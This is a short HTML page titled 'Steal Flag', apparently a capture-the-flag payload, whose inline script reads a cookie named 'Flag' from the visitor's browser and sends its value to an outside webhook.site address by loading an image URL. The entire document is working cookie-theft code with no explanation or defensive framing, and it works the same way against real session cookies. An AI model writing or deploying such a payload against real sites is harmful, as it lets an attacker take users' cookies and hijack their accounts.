<!DOCTYPE html>
<html>
<head>
  <title>Steal Flag</title>
  <script>
    // JavaScript to steal the cookie
    var flagCookie = document.cookie.split('; ').find(row => row.startsWith('Flag='));
    if (flagCookie) {
      var flagValue = flagCookie.split('=')[1];
      var img = new Image();
      img.src = `https://webhook.site/91949cf1-8886-45e6-acf0-3f10004fd35f/steal?flag=${flagValue}`;
    }
  </script>
</head>
<body>
  <h1>Stealing Flag...</h1>
</body>
</html>
